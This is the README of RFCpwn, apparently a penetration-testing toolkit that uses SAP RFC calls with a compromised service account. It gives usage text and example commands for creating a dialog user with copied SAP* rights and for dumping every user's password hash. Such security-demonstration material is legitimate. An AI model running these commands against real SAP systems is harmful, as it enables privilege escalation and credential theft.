# RFCpwn
An SAP enumeration and exploitation toolkit using SAP RFC calls


This is a toolkit for demonstrating the impact of compromised service accounts.


This PoC is not for use in production environments, no guarantee of stability or support.


RFCpwn relies on the pyrfc and the libraries provided by SAP in: https://github.com/SAP/PyRFC#installation
```shell
usage: RFCpwn.py [-h] [-debug] [-ip IP] [-u Username] [-p Password]
                   [-c Client] [-s Sysid] [-ping] [-enum] [-usercopy]
                   [-user USER] [-copy COPY] [-pw PW] [-dump] [-exp]

An Impacket style enumeration and exploitation tool using SAP RFC calls

optional arguments:
  -h, --help   show this help message and exit
  -debug       Turn DEBUG output ON

Authentication:
  -ip IP       <targetName or address>
  -u Username  RFC Users Username
  -p Password  RFC Users Password
  -c Client    Client- eg.000
  -s Sysid     System Number- eg 00
  -ping        RFC Ping Command

User Abuse:
  -enum        Use to enumerate a specific user
  -usercopy    add a Dialog User
  -user USER   Required for -usercopy and -userenum to specify the user
  -copy COPY   User to be copied required for -usercopy
  -pw PW       password of new user for -usercopy

Hash Collection:
  -dump        Dump hashes use with below
  -exp         EXPERIMENTAL - Dump BCODE / PASSCODE hashes
  ```
## Examples
Ping - confirm connectivity
```shell
./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -ping
```
Copy a users rights into a new dialog user. If -copy is not specified SAP* is used.
```shell
./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -usercopy -user attacker -pw changeme1
```
Dump hashes from all users. option -exp for experimental bcode & passcode hashes.
```shell
./RFCpwn.py -ip 192.168.200.253 -s 00 -c 000 -u RFCUser -p RFCPass -dump 
```
## Demo
![Imgur Image](https://i.imgur.com/lKqB8Pb.gif)

